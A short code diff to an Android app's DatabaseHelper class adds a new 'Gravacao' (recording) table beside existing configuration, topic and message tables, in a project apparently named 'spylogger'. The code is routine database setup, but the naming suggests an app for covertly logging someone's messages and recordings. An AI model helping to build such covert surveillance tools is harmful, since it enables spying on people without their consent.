@@ -6,6 +6,7 @@ import android.util.Log;
 
 import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.model.Gravacao;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.j256.ormlite.android.apptools.OrmLiteSqliteOpenHelper;
@@ -46,6 +47,8 @@ public class DatabaseHelper extends OrmLiteSqliteOpenHelper {
 			TableUtils.createTableIfNotExists(connectionSource, Configuracao.class);
 			TableUtils.createTableIfNotExists(connectionSource, Topico.class);
 			TableUtils.createTableIfNotExists(connectionSource, Mensagem.class);
+			TableUtils.createTableIfNotExists(connectionSource, Gravacao.class);
+
 			createDefault();
 		} catch (SQLException e) {
 			Log.e(DatabaseHelper.class.getName(), "Unable to create datbases", e);
